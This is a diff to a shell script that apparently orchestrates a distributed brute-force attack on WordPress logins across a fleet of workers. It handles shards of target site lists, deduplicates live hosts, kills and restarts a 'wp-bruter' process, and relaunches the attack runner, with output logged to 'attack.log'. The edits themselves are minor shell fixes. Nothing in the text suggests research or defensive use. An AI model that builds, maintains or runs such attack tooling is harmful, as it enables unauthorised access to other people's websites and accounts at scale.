@@ -37,7 +37,7 @@ for WORKER in $(grep -Ev '^[[:space:]]*(#|$)' "$FLEET_FILE"); do
         IDX=\$(cat shard.idx 2>/dev/null || pgrep -af 'run[.]sh' | sed -n 's#.*run[.]sh \\([0-9]*\\).*#\\1#p' | head -1)
         [ -n "\$IDX" ] || IDX=\$(ls /root/wordpress.s* 2>/dev/null | sed -n 's#.*wordpress[.]s##p' | head -1)
         IDX=\${IDX:-0}
-        [ -s progress.txt ] && [ -f /root/wordpress.s\$IDX ] || { echo \"no progress for shard \$IDX — deploy first\"; exit 0; }
+        if [ ! -s progress.txt ] || [ ! -f /root/wordpress.s\$IDX ]; then echo \"no progress for shard \$IDX — deploy first\"; exit 0; fi
         total=\$(wc -l < /root/wordpress.s\$IDX)
         awk -F'\t' '\$2 != \"network_error\" { print \$1 }' progress.txt \
             | awk '{ h = \$0; sub(/^https?:\/\//, \"\", h); sub(/\/.*/, \"\", h); h = tolower(h); if (!seen[h]) { seen[h] = 1; print \$0 } }' > /tmp/live.url
@@ -49,7 +49,7 @@ for WORKER in $(grep -Ev '^[[:space:]]*(#|$)' "$FLEET_FILE"); do
         cp -f /tmp/live.url /root/wordpress.s\$IDX
         rm -f progress.txt
         pkill -9 -x wp-bruter 2>/dev/null
-        pkill -9 -f 'run[.]sh' 2>/dev/null
+        pkill -9 -f '^/bin/bash ./run[.]sh' 2>/dev/null
         sleep 2
         PHASES=\"\${PHASES:-150 500 0}\" nohup ./run.sh \$IDX >> attack.log 2>&1 &
         sleep 3
